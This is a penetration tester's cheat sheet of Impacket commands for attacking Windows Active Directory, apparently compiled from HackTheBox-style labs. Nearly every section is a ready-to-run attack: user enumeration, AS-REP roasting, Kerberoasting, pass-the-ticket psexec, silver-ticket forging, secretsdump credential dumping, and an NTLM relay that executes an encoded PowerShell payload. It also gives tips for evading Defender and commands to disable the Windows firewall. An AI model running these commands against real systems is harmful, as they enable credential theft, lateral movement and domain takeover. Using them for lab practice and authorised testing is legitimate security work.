## Impacket local user enumeration
condition: SMB IPC$ share readable
```shell
impacket-lookupsid guest@ip_address | grep SidTypeUser
```

## Impacket ASREPRoast
```shell
### with user file
impacket-GetNPUsers -usersfile user.txt -no-pass -dc-ip 10.10.101.184  'vulnnet-rst.local/' -format {hashcat,john} -request

### with one valid credential
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile asreproast.hash <domain>/<user>
```

## Impacket Kerberoasting
```shell
impacket-GetUserSPNs 'Domain/username:password' -outputfile kerberoast.hash -dc-ip $IP -request
```

## smb server
```shell
impacket-smbserver share . -smb2support

# Default group policy: Guest Access in SMB2 is disabled by default, and it blocks accessing to smb share without credentials
# 'You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.'
impacket-smbserver -username uuu -password ppp share . -smb2support

# victim side with powershell
$password = ConvertTo-SecureString -force -AsPlainText "ppp"
$cred = New-Object System.Management.Automation.PSCredential('uuu',$password)
New-PSDrive -name y -root \\<ipaddress>\share -credential $cred -psprovider "filesystem"

# victim side with cmd
net use y:  \\<ipaddress>\share /user:uuu ppp
```

## pass the ticket
```
export KRB5CCNAME=ticket.ccache
impacket-psexec administrator@dc.sequel.htb -k -no-pass     (must specify FQDN)
impacket-secretsdump dc.sequel.htb -k  (must specify FQDN)
```
error:
1. ~~impacket-psexec administrator@sequel.htb -k -no-pass~~:[-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED({Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.)
2. ~~impacket-psexec administrator@10.10.11.202 -k~~:[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)

## impacket-wmiexec
* It won't trigger Defender unlike psexec and smbexec
* To establish a firewall exception for the WMI service, use the following command. (port 49667 required)
```powershell
netsh advfirewall firewall add rule dir=in name="WMI" program=%systemroot%\system32\svchost.exe service=winmgmt action=allow protocol=TCP localport=any
```
```powershell
Set-NetFirewallProfile -Enabled False # turn the entire firewall off
```

## impacket-ticketer
```shell
# -nthash : machine account hash or tgs hash from kerberoast
# silver ticket
impacket-ticketer -nthash e2f1903c02552d1cf428f4f6f83cba4c -domain-sid S-1-5-21-1642562504-1318560604-3878801645 -domain aaa.bbb.ccc -dc-ip 172.16.58.144 -spn <spnname>/WIN-G8TOCIEGCFG.aaa.bbb.ccc test
```
## impacket-smbclient
```shell
impacket-smbclient -k -no-pass -dc-ip <ip> administrator@WIN-G8TOCIEGCFG.aaa.bbb.ccc
impacket-smbclient administrator@172.16.58.144
```

## impacket-secretsdump
```shell
impacket-secretsdump  'machine_account$'@172.16.58.144 -hashes <machine_hash>
```

## impacket-ntlmrelayx
```shell
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQ..."
```

## impacket-mssqlclient 
```shell
impacket-mssqlclient Administrator@192.168.201.18 -windows-auth
# -windows-auth (This forces NTLM authentication (as opposed to Kerberos))
```